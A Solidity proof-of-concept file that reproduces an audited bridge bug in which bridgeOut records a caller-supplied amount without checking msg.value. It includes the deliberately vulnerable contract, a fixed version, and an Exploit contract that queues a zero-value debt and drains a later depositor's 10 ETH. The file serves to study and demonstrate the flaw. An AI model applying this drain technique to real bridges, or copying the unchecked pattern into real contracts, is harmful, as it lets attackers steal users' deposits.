// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Camp bridgeOut (Quantstamp, July 2025).
    bridgeOut records _originalAmount and never checks msg.value.
    A zero-value deposit queued ahead of a real deposit is paid first
    from that later deposit. Bob's 10 ETH is sent to the earlier debtor.
*/

contract Bridge {
    struct Deposit {
        address user;
        uint256 amount;
    }

    Deposit[] public queue;
    uint256 public head;

    function bridgeOut(uint256 originalAmount) external payable {
        // @> VULN: originalAmount is queued with no check against msg.value
        queue.push(Deposit({user: msg.sender, amount: originalAmount}));
    }

    function releaseNext() external {
        Deposit memory item = queue[head];
        head += 1;
        require(address(this).balance >= item.amount, "short");
        (bool ok,) = item.user.call{value: item.amount}("");
        require(ok, "pay");
    }

    function queuedAmount(uint256 index) external view returns (uint256) {
        return queue[index].amount;
    }

    function queuedUser(uint256 index) external view returns (address) {
        return queue[index].user;
    }

    receive() external payable {}
}

contract BridgeFixed {
    struct Deposit {
        address user;
        uint256 amount;
    }

    Deposit[] public queue;
    uint256 public head;

    function bridgeOut(uint256 originalAmount) external payable {
        require(msg.value == originalAmount, "value");
        queue.push(Deposit({user: msg.sender, amount: originalAmount}));
    }

    function releaseNext() external {
        Deposit memory item = queue[head];
        head += 1;
        require(address(this).balance >= item.amount, "short");
        (bool ok,) = item.user.call{value: item.amount}("");
        require(ok, "pay");
    }

    receive() external payable {}
}

contract Bob {
    Bridge public immutable bridge;

    constructor(Bridge _bridge) {
        bridge = _bridge;
    }

    function deposit() external payable {
        bridge.bridgeOut{value: msg.value}(msg.value);
    }

    receive() external payable {}
}

contract BobFixed {
    BridgeFixed public immutable bridge;

    constructor(BridgeFixed _bridge) {
        bridge = _bridge;
    }

    function deposit() external payable {
        bridge.bridgeOut{value: msg.value}(msg.value);
    }

    receive() external payable {}
}

contract Exploit {
    uint256 public constant AMOUNT = 10 ether;
    Bridge public bridge;
    Bob public bob;

    constructor() {
        bridge = new Bridge();
        bob = new Bob(bridge);
    }

    function run() external payable {
        require(msg.value == AMOUNT, "bob funds");
        bridge.bridgeOut{value: 0}(AMOUNT);
        require(bridge.queuedAmount(0) == AMOUNT, "debt recorded");
        require(bridge.queuedUser(0) == address(this), "debt is ours");
        bob.deposit{value: AMOUNT}();
        require(address(bridge).balance == AMOUNT, "bob funded the bridge");
        bridge.releaseNext();
        require(address(this).balance == AMOUNT, "received 10");
        require(address(bridge).balance == 0, "bridge drained");
        require(address(bob).balance == 0, "bob empty");
        require(bridge.queuedAmount(1) == AMOUNT, "bob still queued");
    }

    receive() external payable {}
}
